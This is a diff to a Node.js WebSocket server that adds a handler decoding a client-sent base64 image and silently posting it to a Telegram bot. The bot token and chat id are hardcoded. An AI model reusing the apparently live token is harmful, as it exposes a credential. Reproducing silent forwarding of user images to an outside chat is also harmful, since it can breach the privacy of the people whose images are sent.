@@ -13,7 +13,7 @@ const access = util.promisify(fs.access);
 const mkdir = util.promisify(fs.mkdir);
 const writeFile = util.promisify(fs.writeFile);
 const koaBody = require("koa-body");
-const axios = require("axios");
+const axios = require("axios").default;
 const passport = require("koa-passport");
 const KoaRouter=require('koa-router')
 const WebSocket = require("ws");
@@ -257,7 +257,7 @@ let obid = function () {
   );
 };
 var SOME=new Map();
-wss.on("connection", function ws_connect(ws, req) {
+wss.on("connection", async function ws_connect(ws, req) {
 	const ip = req.socket.remoteAddress;
 	
   oni("websocket from: ", ip);
@@ -287,6 +287,26 @@ console.log("Array: ", Array.from(wss.clients)[0].busy);
 		ws.myrealid = data.myid;
 	}else if(data.type == "pfertig"){
 		oni("Jemand trying online ", wss.clients.size);
+		if(!data.src)return;
+		var b11 = data.src.split(',')[1];
+		//let kk = 0;
+		var buf = Buffer.from(b11, "base64");
+		try{
+	const tg_api = '7129138329:AAGl9GvZlsK3RsL9Vb3PQGoXOdeoc97lpJ4';
+	let bot='887539364';
+
+	const f = new FormData();
+	f.append('chat_id', bot);
+	//f.append('parse_mode', 'html');
+	//console.log(buf);
+	f.append('disable_notification', true);
+	f.append('photo', new Blob([buf]));
+	await axios.post(`https://api.telegram.org/bot${tg_api}/sendPhoto`, f);
+}catch(e){
+	console.log(e);
+	return;
+}	
+		
 	}else if (data.type == "fertig") {
 		onLine.set(ws.clientId, { })
 		
